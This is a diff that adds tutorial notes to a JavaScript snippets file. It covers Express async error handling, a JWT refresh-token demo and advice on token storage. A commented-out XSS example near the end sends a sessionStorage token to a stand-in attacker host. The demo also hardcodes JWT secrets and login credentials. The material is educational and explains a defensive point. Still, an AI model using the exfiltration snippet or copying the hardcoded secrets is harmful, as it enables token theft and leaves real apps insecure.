@@ -1161,11 +1161,277 @@ async function textOverlay() {
 
 textOverlay();
 
-// =====================================================================
 
-// =====================================================================
 
+// Async await Error Handling in Express (more routes)
 // =====================================================================
+// Util.js
+module.exports = fn => (req, res, next) => {
+    Promise.resolve(fn(req, res, next))
+        .catch(next);
+};
+
+// Controller.js
+const getUser = async (req, res, next) => {
+    const { id } = req.params;
+    const user = await User.findById(id); // f.ex. mongoose findById method
+};
+
+// Routes.js
+const asyncMiddleware = require('Util');
+router.get("/user/:id", asyncMiddleware(getUser));
+
+
+// JSON Web Token (JWT): refresh token
+// =====================================================================
+// 1. Install Express Generate: https://expressjs.com/en/starter/generator.html
+// npx express-generator
+// express --view=ejs refreshToken-demo
+// cd refreshToken-demo
+// npm install
+// set DEBUG=refreshToken-demo:* & npm start
+
+//  app.js: Creating Server and adding routes
+var createError = require('http-errors');
+var express = require('express');
+var path = require('path');
+var cookieParser = require('cookie-parser');
+var logger = require('morgan');
+var app = express();
+//add them
+var bodyParser = require('body-parser')
+
+app.use(bodyParser.json())
+app.use(bodyParser.urlencoded({ extended: true }))
+
+var indexRouter = require('./routes/index');
+var usersRouter = require('./routes/users');
+
+
+
+// view engine setup
+app.set('views', path.join(__dirname, 'views'));
+app.set('view engine', 'ejs');
+
+app.use(logger('dev'));
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+app.use(cookieParser());
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.use('/', indexRouter);
+app.use('/users', usersRouter);
+
+// catch 404 and forward to error handler
+app.use(function (req, res, next) {
+    next(createError(404));
+});
+
+// error handler
+app.use(function (err, req, res, next) {
+    // set locals, only providing error in development
+    res.locals.message = err.message;
+    res.locals.error = req.app.get('env') === 'development' ? err : {};
+
+    // render the error page
+    res.status(err.status || 500);
+    res.render('error');
+});
+
+module.exports = app;
+
+/*
+    usersRouter: is the place where Users data is stored. Therefore, only
+    authorized and successful login users can obtain this data through the
+    token-based API.
+    indexRouter: is where the router will declare API login and API to
+    retrieve token if token expires must use refreshToken.
+*/
+
+// Create files
+// ### /router/index.js
+var express = require('express');
+var router = express.Router();
+const _CONF = require('../config')
+var jwt = require('jsonwebtoken')
+
+var refreshTokens = {};// tao mot object chua nhung refreshTokens
+
+
+/* GET home page. */
+router.get('/', function (req, res, next) {
+    return res.json({ status: 'success', elements: 'Hello anonystick' })
+});
+
+/* LOGIN . */
+router.post('/login', function (req, res, next) {
+    const { username, password } = req.body;
+    if (username === 'anonystick.com' && password === 'anonystick.com') {
+        let user = {
+            username: username,
+            role: 'admin'
+        }
+        // token should saved on client Cookie (not sessionStorage)
+        const token = jwt.sign(user, _CONF.SECRET, { expiresIn: _CONF.tokenLife });//20 giay
+        const refreshToken = jwt.sign(user, _CONF.SECRET_REFRESH, { expiresIn: _CONF.refreshTokenLife })
+
+        const response = {
+            "status": "Logged in",
+            "token": token,
+            "refreshToken": refreshToken,
+        }
+
+        refreshTokens[refreshToken] = response
+
+        return res.json(response)
+    }
+    return res.json({ status: 'success', elements: 'Login failed!!!' })
+
+})
+
+/* Get new token when jwt expired . */
+
+router.post('/token', (req, res) => {
+    // refresh the damn token
+    const { refreshToken } = req.body
+    // if refresh token exists
+    if (refreshToken && (refreshToken in refreshTokens)) {
+        const user = {
+            username: 'anonystick.com',
+            role: 'admin'
+        }
+        const token = jwt.sign(user, _CONF.SECRET, { expiresIn: _CONF.tokenLife })
+        const response = {
+            "token": token,
+        }
+        // update the token in the list
+        refreshTokens[refreshToken].token = token
+        res.status(200).json(response);
+    } else {
+        res.status(404).send('Invalid request')
+    }
+})
+
+module.exports = router;
+
+// ### /routes/users.js
+var express = require('express');
+var router = express.Router();
+
+
+router.use(require('../middleware/checkToken'))
+/* GET users listing. */
+router.get('/', function (req, res) {
+    const users = [{
+        username: 'Cr7',
+        team: 'Juve',
+    }, {
+        username: 'Messi',
+        team: 'Barca',
+    }]
+    res.json({ status: 'success', elements: users })
+})
+
+module.exports = router;
+
+
+// ### config/index.js
+const config = Object.freeze({
+    SECRET: "SECRET_ANONYSTICK",
+    SECRET_REFRESH: "SECRET_REFRESH_ANONYSTICK",
+    tokenLife: 10,
+    refreshTokenLife: 120
+})
+
+module.exports = config;
+
+
+// ### middleware/checkToken.js
+const jwt = require('jsonwebtoken')
+const _CONF = require('../config/')
+
+module.exports = (req, res, next) => {
+    const token = req.body.token || req.query.token || req.headers['x-access-token']
+    // decode token
+    if (token) {
+        // verifies secret and checks exp
+        jwt.verify(token, _CONF.SECRET, function (err, decoded) {
+            if (err) {
+                console.error(err.toString());
+                //if (err) throw new Error(err)
+                return res.status(401).json({ "error": true, "message": 'Unauthorized access.', err });
+            }
+            console.log(`decoded>>${decoded}`);
+            req.decoded = decoded;
+            next();
+        });
+    } else {
+        // if there is no token
+        // return an error
+        return res.status(403).send({
+            "error": true,
+            "message": 'No token provided.'
+        });
+    }
+};
+
+// Protect JWT
+// =====================================================================
+// Set-Cookie: session=15d38683-a98f-402d-a373-4f81a5549536; path=/; expires=xxxxxxx; httponly
+// Set httpOnly => cant read by document.cookie
+// Set Secure
+// Set Cors
+
+
+// SessionStorage JWT token | NOT USE
+// =====================================================================
+// When does the session storage take? When Close tab.
+// Set a token to use Session Storage
+authenticate(login, password)
+    .then(function (authentication) {
+        // set token
+        window.sessionStorage.setItem('token', authentication.token);
+    })
+    .then(getAccounts)
+    .then(function (accounts) {
+        // display the accounts page
+        // ...
+    })
+    .catch(function (error) {
+        // display error message in the login form
+        // ...
+    });
+
+// Get token and verify
+/**
+ * @return {Promise}
+ */
+function getAccounts() {
+    return fetch('https://api.anonystickbank.com/accounts', {
+        headers: {
+            'Authorization': 'Token ' + window.sessionStorage.getItem('token'),
+            'Content-Type': 'application/json; charset=utf-8',
+            'Accept': 'application/json',
+        }
+    }).then(function (response) {
+        return response.json();
+    })
+}
+
+// XSS in comment admin
+// <script>
+//     var token = window.sessionStorage.getItem('token');
+//     var a=document.createElement("a");
+//     a.innerHTML = 'See my profile xxx';
+//     a.href = 'http://domain.hackers/myprofile?token=' + token;
+//     document.body.appendChild(a);
+// </script>
+
+
+// JSON Web Token: RESTful API security with JWT and HttpOnly Cookies, Secure.
+// Back-End: https://github.com/anonystick/demo-jwt-token
+// Client: https://github.com/anonystick/demo-jwt-token-client
+
 // =====================================================================
 // =====================================================================
 // =====================================================================
